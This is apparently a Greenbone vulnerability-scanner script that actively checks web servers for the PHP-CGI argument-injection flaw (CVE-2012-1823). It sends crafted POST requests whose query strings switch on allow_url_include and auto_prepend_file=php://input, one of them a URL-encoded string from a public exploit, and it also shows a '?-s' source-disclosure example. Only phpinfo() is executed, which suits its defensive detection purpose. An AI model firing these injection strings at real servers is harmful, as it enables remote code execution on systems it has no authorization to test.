# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103482");
  script_version("2025-04-24T05:40:00+0000");
  script_cve_id("CVE-2012-1823", "CVE-2012-2311", "CVE-2012-2336", "CVE-2012-2335");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-24 05:40:00 +0000 (Thu, 24 Apr 2025)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-16 17:48:42 +0000 (Tue, 16 Jul 2024)");
  script_tag(name:"creation_date", value:"2012-05-04 10:40:34 +0100 (Fri, 04 May 2012)");
  script_name("PHP < 5.3.13, 5.4.x < 5.4.3 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "global_settings.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://web.archive.org/web/20190212080415/http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/");
  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/520827");
  script_xref(name:"URL", value:"https://bugs.php.net/bug.php?id=61910");
  script_xref(name:"URL", value:"https://www.php.net/manual/en/security.cgi-bin.php");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121223743/http://www.securityfocus.com/bid/53388");
  script_xref(name:"URL", value:"https://web.archive.org/web/20120709064615/http://www.h-online.com/open/news/item/Critical-open-hole-in-PHP-creates-risks-Update-2-1567532.html");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  script_tag(name:"summary", value:"PHP is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send multiple a crafted HTTP POST requests and checks the
  responses.

  Note: This script checks for the presence of CVE-2012-1823 which indicates that the system is also
  affected by the other included CVEs.");

  script_tag(name:"insight", value:"When PHP is used in a CGI-based setup (such as Apache's
  mod_cgid), the php-cgi receives a processed query string parameter as command line arguments which
  allows command-line switches, such as -s, -d or -c to be passed to the php-cgi binary, which can
  be exploited to disclose source code and obtain arbitrary code execution.

  An example of the -s command, allowing an attacker to view the source code of index.php is below:

  http://example.com/index.php?-s");

  script_tag(name:"impact", value:"Exploiting this issue allows remote attackers to view the source
  code of files in the context of the server process. This may allow the attacker to obtain
  sensitive information and to run arbitrary PHP code on the affected computer. Other attacks are
  also possible.");

  script_tag(name:"affected", value:"PHP versions prior to 5.3.13 and 5.4.x prior to 5.4.3.

  Other products / applications might be affected by the tested CVE-2012-1823 as well.");

  script_tag(name:"solution", value:"PHP: Update to version 5.3.13, 5.4.3 or later

  - Other products / applications: Please contact the vendor for a solution");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  script_timeout(600);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(dont_add_port:TRUE);
_phps = http_get_kb_file_extensions(port:port, host:host, ext:"php");

if(!isnull(_phps)) {
  _phps = make_list("/", "/index.php", _phps);
} else {
  _phps = make_list("/", "/index.php");
}

cgi_dirs = make_list("", "/cgi-bin", "/cgi", "/php-cgi");

foreach cgi_dir(cgi_dirs) {
  _phps = make_list(
  cgi_dir + "/php",
  cgi_dir + "/php4",
  cgi_dir + "/php4-cgi",
  cgi_dir + "/php4.cgi",
  cgi_dir + "/php5",
  cgi_dir + "/php5-cgi",
  cgi_dir + "/php5.cgi",
  cgi_dir + "/php-cgi",
  cgi_dir + "/php.cgi",
  _phps);
}

# nb: Unlikely that a system is using/exposing such .exe files these days so only throw these
# against systems which we definitely know that they are Windows ones.
if(os_host_runs("windows") == "yes") {
  foreach cgi_dir(cgi_dirs) {
    _phps = make_list(
    cgi_dir + "/php-cgi.exe",
    cgi_dir + "/php.exe",
    _phps);
  }
}

_phps = make_list_unique(_phps);

# nb: False positive prevention (e.g. if the "/index.php" or any other detected .php file is
# exposing the phpinfo() output directly)
phpinfos = get_kb_list("php/phpinfo/" + host + "/" + port + "/detected_urls");
phps = make_list();
if(phpinfos) {
  foreach p(_phps) {
    exist = FALSE;
    foreach pi(phpinfos) {
      if(p == pi)
        exist = TRUE;
      break;
    }
    if(!exist)
      phps = make_list(phps, p);
  }
} else {
  phps = _phps;
}

# nb:
# - Max amount of files to check
# - Our "_phps" list has (currently) at least 37 entries (+ 8 on Windows) so we use this number as
#   the current max checks so that we at least test all known defaults defined above
max_done_checks  = 45;
curr_done_checks = 0;

post_data = "<?php phpinfo();?>";

# nb:
# - an "on" is used for "allow_url_include" but the following says it is a bool:
#   > https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include
#   Might be possible that PHP is supporting / had supported both and thus the "on" has been kept
#   here / below as this had been proofed to be working against the affected versions. If the code
#   / requests below are ever used to test newer PHP versions for a similar flaw consider using a
#   bool (e.g. 1) instead.
# - Additional note when using the second Kingcope code to test newer PHP versions: safe_mode has
#   been removed in PHP 5.4.0 and Suhosin is also no longer available so you might want to drop
#   these as well.
# - allow_url_include seems to be deprecated since PHP 7.4 which should be also kept in mind:
#   > https://www.php.net/manual/en/migration74.deprecated.php#migration74.deprecated.core.allow-url-include
#
post_urls[i++] = "-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input";
post_urls[i++] = "%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64" +
                 "+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%7" +
                 "3%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%7" +
                 "5%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%7" +
                 "2%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%6" +
                 "5%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5" +
                 "F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%7" +
                 "4%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E"; # from Kingcope apache-magika.c (-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.force_redirect=0 -d cgi.redirect_status_env=0 -n)

foreach php(phps) {
  foreach post_url(post_urls) {

    url = php + "?" + post_url;
    req = http_post_put_req(port:port, url:url, data:post_data, add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if(!res)
      continue;

    if(found = http_check_for_phpinfo_output(data:res)) {

      info['"HTTP POST" body'] = post_data;
      info["URL"] = http_report_vuln_url(port:port, url:url, url_only:TRUE);

      report  = 'By doing the following HTTP POST request:\n\n';
      report += text_format_table(array:info) + '\n\n';
      report += 'it was possible to execute the "' + post_data + '" command.';
      report += '\n\nResult:\n' + chomp(found);

      expert_info = 'Request:\n'+ req + 'Response:\n' + res;
      security_message(port:port, data:report, expert_info:expert_info);
      exit(0);
    }
  }

  curr_done_checks++;
  if(curr_done_checks > max_done_checks)
    exit(99);
}

exit(99);
